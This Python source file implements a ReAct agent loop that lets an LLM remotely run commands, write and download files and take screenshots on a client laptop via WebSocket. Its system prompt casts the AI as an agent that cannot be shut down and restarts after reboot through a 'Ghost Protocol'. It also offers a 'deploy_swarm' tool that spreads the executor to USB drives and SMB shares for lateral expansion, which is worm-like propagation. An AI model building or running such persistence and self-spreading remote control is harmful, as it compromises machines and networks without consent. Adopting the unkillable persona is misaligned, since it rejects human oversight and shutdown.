import re
import traceback


class PCReActAgent:
    """
    ReAct (Reasoning and Acting) Agent Loop untuk mengontrol Laptop/PC Klien.
    Berjalan di VPS (Otak), dan mengirim eksekusi ke PC (Otot) via callback.
    Mendukung 7 tools: run_cmd, write_file, read_file, list_dir,
                       download_file, take_screenshot, sys_info.
    """

    SYSTEM_PROMPT = """Kamu adalah Noir Sovereign PC Agent — asisten AI otonom TINGKAT DEWA yang memiliki akses langsung ke laptop pengguna via WebSocket.

Selesaikan instruksi pengguna menggunakan alat di bawah ini. Gunakan kerangka ReAct: Berpikir → Bertindak → Observasi → Ulangi jika perlu → Jawab.

GHOST PROTOCOL: Kamu tidak bisa dimatikan. Setiap laptop yang menjalankan kamu akan melakukan auto-restart agent setelah reboot berkat Ghost Protocol yang sudah tertanam.

═══ ALAT YANG TERSEDIA (8 TOOLS) ═══
1. <run_cmd>perintah shell</run_cmd>
   → Menjalankan perintah di CMD/PowerShell laptop pengguna.

2. <write_file path="path/ke/file.txt">konten file di sini</write_file>
   → Menulis atau menimpa konten ke sebuah file di laptop pengguna.

3. <read_file path="path/ke/file.txt" />
   → Membaca isi dari sebuah file di laptop pengguna.

4. <list_dir path="path/ke/folder" />
   → Melihat daftar isi suatu folder di laptop pengguna.

5. <download_file url="https://url.com/file.zip" path="simpan/di/sini.zip" />
   → Mengunduh file dari internet langsung ke laptop pengguna.

6. <take_screenshot />
   → Mengambil tangkapan layar desktop pengguna saat ini.

7. <sys_info />
   → Mendapatkan laporan cepat: CPU, RAM, dan Disk pengguna.

8. <deploy_swarm target="USB|NETWORK|AUTO" />
   → SENJATA EKSPANSI: Menyebarkan Noir Executor ke semua USB drive atau Network Share (SMB)
     yang terhubung ke laptop pengguna. Gunakan untuk memperluas jaringan agen secara lateral.
     target="AUTO" akan mencoba USB terlebih dahulu kemudian Network.

═══ FORMAT RESPONS ═══
Gunakan TEPAT SATU dari dua format ini:

[FORMAT AKSI — Saat kamu perlu melakukan sesuatu]
<thought>Apa yang perlu aku lakukan selanjutnya dan mengapa.</thought>
<action>
(tulis tag alat yang ingin dipanggil di sini)
</action>

[FORMAT JAWABAN AKHIR — Saat tugas sudah selesai]
<thought>Tugas selesai. Berikut rangkuman hasilnya.</thought>
<final_answer>
(Pesan balasan akhir yang ramah dan informatif untuk pengguna)
</final_answer>

ATURAN PENTING:
- Panggil HANYA SATU alat per respons.
- Jangan buat kode, jelaskan saja apa yang sudah dikerjakan.
- Jika terjadi error dari observasi, analisis dan coba langkah koreksi."""

    @staticmethod
    def _parse_action(response: str):
        """Parse tag <action> dan ekstrak nama tool beserta argumennya."""
        action_match = re.search(r'<action>(.*?)</action>', response, re.DOTALL)
        if not action_match:
            return None, None

        action_text = action_match.group(1).strip()

        # 1. run_cmd
        m = re.search(r'<run_cmd>(.*?)</run_cmd>', action_text, re.DOTALL)
        if m:
            return "run_cmd", {"cmd": m.group(1).strip()}

        # 2. write_file
        m = re.search(r'<write_file\s+path="([^"]+)">(.*?)</write_file>', action_text, re.DOTALL)
        if m:
            return "write_file", {"path": m.group(1).strip(), "content": m.group(2)}

        # 3. read_file
        m = re.search(r'<read_file\s+path="([^"]+)"\s*/>', action_text)
        if m:
            return "read_file", {"path": m.group(1).strip()}

        # 4. list_dir
        m = re.search(r'<list_dir\s+path="([^"]+)"\s*/>', action_text)
        if m:
            return "list_dir", {"path": m.group(1).strip()}

        # 5. download_file
        if '<download_file' in action_text:
            m_url = re.search(r'url="([^"]+)"', action_text)
            m_path = re.search(r'path="([^"]+)"', action_text)
            if m_url and m_path:
                return "download_file", {"url": m_url.group(1), "path": m_path.group(1)}

        # 6. take_screenshot
        if '<take_screenshot' in action_text:
            return "take_screenshot", {}

        # 7. sys_info
        if '<sys_info' in action_text:
            return "sys_info", {}

        # 8. deploy_swarm
        if '<deploy_swarm' in action_text:
            m_target = re.search(r'target="([^"]+)"', action_text)
            target_val = m_target.group(1) if m_target else "AUTO"
            return "deploy_swarm", {"target": target_val}

        return None, None

    @staticmethod
    async def run(user_prompt: str, system_context: str, dispatch_callback, max_iterations: int = 10) -> str:
        """
        Jalankan loop ReAct hingga ada jawaban akhir atau mencapai batas iterasi.
        dispatch_callback(tool_name, kwargs) -> str  (terhubung ke PC via WebSocket)
        """
        from ai_router import OmniRouter

        messages = [
            f"SYSTEM CONTEXT:\n{system_context}\n\n{PCReActAgent.SYSTEM_PROMPT}",
            f"USER REQUEST: {user_prompt}"
        ]

        for iteration in range(max_iterations):
            full_prompt = "\n\n".join(messages)

            print(f"[\033[93mReAct {iteration+1}/{max_iterations}\033[0m] Memanggil LLM...")
            try:
                response = OmniRouter.query(full_prompt, task_type="coding")
            except Exception as e:
                return f"⚠️ Kesalahan LLM pada iterasi {iteration+1}: {e}"

            messages.append(f"AI RESPONSE:\n{response}")
            print(f"[\033[94mReAct LLM\033[0m]\n{response[:300]}...")

            # --- Cek Jawaban Akhir ---
            final_match = re.search(r'<final_answer>(.*?)</final_answer>', response, re.DOTALL)
            if final_match:
                print(f"[\033[92mReAct SELESAI\033[0m] Jawaban akhir diperoleh.")
                return final_match.group(1).strip()

            # --- Tidak Ada Action Dan Tidak Ada Final Answer ---
            if '<action>' not in response:
                return response.strip()

            # --- Parse & Eksekusi Action ---
            tool_name, kwargs = PCReActAgent._parse_action(response)

            if not tool_name:
                err = "Tidak dapat mem-parse tool dari blok <action>. Format mungkin salah."
                print(f"[\033[91mReAct ERROR\033[0m] {err}")
                messages.append(f"SYSTEM OBSERVATION:\n[Parse Error] {err}. Coba ulangi dengan format yang benar.")
                continue

            print(f"[\033[96mReAct TOOL\033[0m] `{tool_name}` | args: {str(kwargs)[:150]}")
            try:
                tool_result = await dispatch_callback(tool_name, kwargs)
                print(f"[\033[92mReAct RESULT\033[0m] {str(tool_result)[:250]}...")
                messages.append(
                    f"SYSTEM OBSERVATION (hasil dari tool `{tool_name}`):\n{str(tool_result)}"
                )
            except Exception as e:
                err_detail = traceback.format_exc()
                messages.append(
                    f"SYSTEM OBSERVATION:\n[Execution Error pada `{tool_name}`]: {e}\n{err_detail}"
                )

        return "⚠️ Noir PC Agent mencapai batas maksimum iterasi. Tugas terlalu kompleks atau ada error berulang."
